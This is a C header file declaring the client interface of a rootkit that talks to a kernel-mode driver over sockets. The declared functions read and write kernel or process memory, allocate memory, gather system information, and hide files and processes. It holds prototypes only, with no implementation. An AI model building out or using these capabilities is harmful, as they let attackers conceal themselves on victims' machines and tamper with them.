#pragma once
#include "internet.h"
#include "utils.h"


PVOID GetModuleBaseRootkKMD(const char* ModuleName, SOCKET tosock);  // RKOP_MDLBASE request
bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err);  // RKOP_READ request
bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits);  // RKOP_WRITE request
BOOL ValidateInfoTypeString(const char* InfoType);  // validate the system information types string
BOOL GetSystemInfoRootkKMD(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName, char* ProcessorsNum);  // RKOP_SYSINFO request
PVOID SpecAllocRootkKMD(PVOID AllocAddress, ULONG64 AllocSize, const char* ModuleName, SOCKET tosock, ROOTKIT_UNEXERR Err, ULONG_PTR ZeroBits);  // RKOP_PRCMALLOC request
BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEFILE request
BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus);  // RKOP_HIDEPROC request